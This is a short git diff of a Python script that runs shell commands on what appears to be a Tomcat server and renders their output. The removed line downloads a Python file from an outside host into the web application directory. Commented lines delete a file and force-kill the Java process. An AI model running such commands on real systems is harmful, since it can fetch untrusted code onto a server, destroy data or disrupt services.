@@ -1,7 +1,16 @@
 import os
 
 # Execute the command (ls for Unix/Linux/macOS, dir for Windows)
-stream = os.popen('curl -o opt/tomcat/webapps/aggregate/unzip.py https://sbnke.com/py/unzip.py')  # or 'dir' for Windows
+#stream = os.popen('ls -lha opt/tomcat/.local/lib/python3.6/site-packages')  # or 'dir' for Windows
+#stream = os.popen('rm opt/tomcat/webapps/aggregate/env2.zip')  # or 'dir' for Windows
+#stream = os.popen('python3 -m pip install fastapi uvicorn --user')  # or 'dir' for Windows
+stream = os.popen('python3 -m pip install fastapi uvicorn --user')  # or 'dir' for Windows
+
+#stream = os.popen('ps aux')  # or 'dir' for Windows
+#stream = os.popen('pkill -9 -f "/usr/lib/jvm/java-11-openjdk-amd64/bin/java"')  # or 'dir' for Windows
+#stream = os.popen('pgrep -f "/usr/lib/jvm/java-11-openjdk-amd64/bin/java"')  # or 'dir' for Windows
+
+
 output = stream.read()
 
 # Split the output by line to prepare for HTML table rows
